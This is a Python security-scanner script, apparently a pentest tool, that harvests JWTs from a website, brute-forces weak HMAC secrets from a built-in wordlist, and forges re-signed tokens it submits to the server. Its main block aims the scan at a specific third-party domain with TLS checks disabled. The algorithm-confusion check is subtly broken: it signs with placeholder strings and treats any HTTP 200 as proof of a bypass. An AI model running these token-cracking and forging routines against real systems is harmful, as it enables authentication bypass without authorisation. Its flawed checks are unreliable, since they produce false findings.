import base64
import json
import hmac
import hashlib
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class JWTAnalyzer:
    def __init__(self, target_url):
        if not target_url.startswith("http"):
            target_url = "https://" + target_url
        self.target = target_url
        self.session = requests.Session()
        self.session.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        self.findings = []
        self.found_tokens = []
        print(f"JWT Analyzer Ready! Target: {self.target}")

    # ============================================================
    # STEP 1 — Collect JWT tokens from website
    # ============================================================
    def collect_tokens(self):
        """
        Finds JWT tokens in:
        - HTTP response headers
        - Cookies
        - Response body
        WHY: JWT tokens are the keys to the kingdom —
        finding and analyzing them reveals auth weaknesses
        """
        print("[*] Collecting JWT tokens...")

        try:
            resp = self.session.get(self.target, timeout=10, verify=False)

            # JWT pattern — 3 base64 parts separated by dots
            jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]*'

            # Check response body
            tokens_in_body = re.findall(jwt_pattern, resp.text)
            for token in tokens_in_body:
                if token not in self.found_tokens:
                    self.found_tokens.append(token)
                    print(f"[+] JWT found in body: {token[:50]}...")

            # Check response headers
            for header, value in resp.headers.items():
                tokens_in_header = re.findall(jwt_pattern, value)
                for token in tokens_in_header:
                    if token not in self.found_tokens:
                        self.found_tokens.append(token)
                        print(f"[+] JWT found in header {header}: {token[:50]}...")

            # Check cookies
            for cookie_name, cookie_value in resp.cookies.items():
                tokens_in_cookie = re.findall(jwt_pattern, cookie_value)
                for token in tokens_in_cookie:
                    if token not in self.found_tokens:
                        self.found_tokens.append(token)
                        print(f"[+] JWT found in cookie {cookie_name}: {token[:50]}...")

            print(f"[+] Total tokens found: {len(self.found_tokens)}")

        except Exception as e:
            print(f"[!] Token collection error: {e}")

    # ============================================================
    # STEP 2 — Decode JWT token
    # ============================================================
    def decode_token(self, token):
        """
        Decodes JWT without verifying signature.
        WHY: JWT payload is just base64 — anyone can read it!
        This reveals what data is stored in token.
        Developers sometimes store sensitive data here by mistake!
        """
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None, None

            # Add padding if needed
            def decode_part(part):
                padding = 4 - len(part) % 4
                if padding != 4:
                    part += "=" * padding
                return json.loads(base64.urlsafe_b64decode(part))

            header = decode_part(parts[0])
            payload = decode_part(parts[1])

            return header, payload

        except Exception:
            return None, None

    # ============================================================
    # STEP 3 — Check algorithm vulnerabilities
    # ============================================================
    def check_algorithm(self, token, header):
        """
        Checks for weak or dangerous JWT algorithms.
        WHY:
        - 'none' algorithm = no signature = anyone can forge tokens!
        - HS256 with weak secret = brute forceable!
        - RS256 = most secure
        """
        if not header:
            return

        algorithm = header.get("alg", "unknown").upper()
        print(f"[*] JWT Algorithm: {algorithm}")

        # Algorithm none = CRITICAL
        if algorithm == "NONE":
            self.findings.append({
                "type": "JWT Algorithm None",
                "detail": "JWT uses 'none' algorithm — signature verification bypassed!",
                "severity": "CRITICAL",
                "evidence": f"Algorithm: {algorithm}",
                "url": self.target
            })
            print("[CRITICAL] Algorithm none detected!")

        # Weak algorithms
        elif algorithm in ["HS256", "HS384", "HS512"]:
            self.findings.append({
                "type": "JWT Weak Algorithm",
                "detail": f"JWT uses symmetric algorithm {algorithm} — vulnerable to secret brute force",
                "severity": "MEDIUM",
                "evidence": f"Algorithm: {algorithm}",
                "url": self.target
            })
            print(f"[MEDIUM] Symmetric algorithm {algorithm} — checking for weak secret...")
            # Try to crack the secret
            self.crack_secret(token)

        # Strong algorithms
        elif algorithm in ["RS256", "RS384", "RS512", "ES256"]:
            print(f"[+] Strong algorithm {algorithm} — good!")

    # ============================================================
    # STEP 4 — Try to crack weak JWT secret
    # ============================================================
    def crack_secret(self, token):
        """
        Tests common weak JWT secrets.
        WHY: Many developers use simple secrets like 'secret' or 'password'
        If we crack it — we can forge tokens for ANY user including admin!
        Real example: Many startups use default secrets from tutorials!
        """
        print("[*] Testing common JWT secrets...")

        weak_secrets = [
            "secret", "password", "123456", "admin",
            "key", "private", "jwt_secret", "mysecret",
            "your_secret_key", "super_secret", "change_me",
            "development", "production", "test", "demo",
            "qwerty", "letmein", "welcome", "monkey",
            "dragon", "master", "hello", "abc123",
            "secretkey", "jwtkey", "mykey", "appkey",
            "secrettoken", "token", "auth", "secure",
            "SECRET_KEY", "JWT_SECRET", "APP_SECRET",
        ]

        parts = token.split(".")
        if len(parts) != 3:
            return

        message = f"{parts[0]}.{parts[1]}"
        original_signature = parts[2]

        for secret in weak_secrets:
            try:
                # Recreate signature with this secret
                test_sig = hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha256
                ).digest()

                test_sig_b64 = base64.urlsafe_b64encode(test_sig).decode().rstrip("=")

                if test_sig_b64 == original_signature:
                    self.findings.append({
                        "type": "JWT Weak Secret Cracked",
                        "detail": f"JWT secret cracked! Secret is: '{secret}'",
                        "severity": "CRITICAL",
                        "evidence": f"Cracked secret: {secret}",
                        "url": self.target
                    })
                    print(f"[CRITICAL] JWT SECRET CRACKED: '{secret}'")
                    return

            except Exception:
                pass

        print("[+] Common secrets failed — secret appears strong!")

    # ============================================================
    # STEP 5 — Check payload for sensitive data
    # ============================================================
    def check_payload_sensitivity(self, payload):
        """
        Checks if JWT payload contains sensitive information.
        WHY: JWT payload is base64 — NOT encrypted!
        Anyone can decode and read it.
        Storing passwords or secrets here = data exposure!
        """
        if not payload:
            return

        sensitive_keys = [
            "password", "passwd", "pwd", "secret",
            "credit_card", "card_number", "cvv", "ssn",
            "social_security", "bank_account", "api_key",
            "private_key", "access_key", "aws_secret"
        ]

        for key in payload:
            if any(sensitive in key.lower() for sensitive in sensitive_keys):
                self.findings.append({
                    "type": "Sensitive Data in JWT Payload",
                    "detail": f"Sensitive field '{key}' found in JWT payload",
                    "severity": "HIGH",
                    "evidence": f"Field: {key} (value hidden for security)",
                    "url": self.target
                })
                print(f"[HIGH] Sensitive data in JWT: {key}")

        # Check expiry
        if "exp" not in payload:
            self.findings.append({
                "type": "JWT No Expiration",
                "detail": "JWT token has no expiration — valid forever!",
                "severity": "MEDIUM",
                "evidence": "No 'exp' claim in payload",
                "url": self.target
            })
            print("[MEDIUM] JWT has no expiration!")

        # Check issued at
        if "iat" not in payload:
            self.findings.append({
                "type": "JWT No Issue Time",
                "detail": "JWT missing issued-at claim — replay attacks possible",
                "severity": "LOW",
                "evidence": "No 'iat' claim in payload",
                "url": self.target
            })

    # ============================================================
    # STEP 6 — Test algorithm confusion attack
    # ============================================================
    def check_algorithm_confusion(self, token):
        """
        Tests RS256 to HS256 algorithm confusion attack.
        WHY: If server uses RS256 but also accepts HS256,
        attacker can use PUBLIC key as HMAC secret!
        Public key is... public. So attacker can forge tokens!
        This is an advanced attack that bypasses authentication completely.
        """
        print("[*] Testing algorithm confusion attack...")

        parts = token.split(".")
        if len(parts) != 3:
            return

        try:
            # Create modified header with HS256
            new_header = {"alg": "HS256", "typ": "JWT"}
            new_header_b64 = base64.urlsafe_b64encode(
                json.dumps(new_header).encode()
            ).decode().rstrip("=")

            # Try signing with common public key strings
            test_secrets = ["public", "pubkey", "rsa_public"]

            for secret in test_secrets:
                message = f"{new_header_b64}.{parts[1]}"
                test_sig = hmac.new(
                    secret.encode(),
                    message.encode(),
                    hashlib.sha256
                ).digest()
                test_sig_b64 = base64.urlsafe_b64encode(test_sig).decode().rstrip("=")
                forged_token = f"{new_header_b64}.{parts[1]}.{test_sig_b64}"

                resp = self.session.get(
                    self.target,
                    headers={"Authorization": f"Bearer {forged_token}"},
                    timeout=5,
                    verify=False
                )

                if resp.status_code == 200:
                    self.findings.append({
                        "type": "JWT Algorithm Confusion",
                        "detail": "Algorithm confusion attack successful — RS256 to HS256 bypass!",
                        "severity": "CRITICAL",
                        "evidence": f"Forged token accepted with secret: {secret}",
                        "url": self.target
                    })
                    print(f"[CRITICAL] Algorithm confusion attack worked!")
                    return

        except Exception as e:
            print(f"[!] Algorithm confusion test error: {e}")

    # ============================================================
    # MAIN — Run complete JWT analysis
    # ============================================================
    def run_full_scan(self):
        print("\n" + "="*60)
        print("SecureScope JWT Token Analyzer")
        print("="*60)

        # Step 1 — Find tokens
        self.collect_tokens()

        if not self.found_tokens:
            print("[!] No JWT tokens found on homepage")
            print("[*] Tip: JWT tokens appear after login — test manually!")
            return self.findings

        # Step 2 — Analyze each token
        for i, token in enumerate(self.found_tokens):
            print(f"\n[*] Analyzing token {i+1}/{len(self.found_tokens)}")
            print(f"[*] Token: {token[:60]}...")

            # Decode token
            header, payload = self.decode_token(token)

            if header:
                print(f"[*] Header: {header}")
            if payload:
                print(f"[*] Payload keys: {list(payload.keys())}")

            # Run all checks
            self.check_algorithm(token, header)
            self.check_payload_sensitivity(payload)
            self.check_algorithm_confusion(token)

        print("\n" + "="*60)
        print(f"JWT Analysis Complete!")
        print(f"Total Findings: {len(self.findings)}")

        critical = sum(1 for f in self.findings if f["severity"] == "CRITICAL")
        high = sum(1 for f in self.findings if f["severity"] == "HIGH")
        medium = sum(1 for f in self.findings if f["severity"] == "MEDIUM")

        print(f"CRITICAL: {critical} | HIGH: {high} | MEDIUM: {medium}")
        print("="*60)

        return self.findings


if __name__ == "__main__":
    scanner = JWTAnalyzer("https://sharpener.tech")
    findings = scanner.run_full_scan()

    print("\n--- DETAILED FINDINGS ---")
    for f in findings:
        print(f"\n[{f['severity']}] {f['type']}")
        print(f"  Detail  : {f['detail']}")
        print(f"  Evidence: {f.get('evidence', 'N/A')[:80]}")
        print(f"  URL     : {f['url'][:80]}")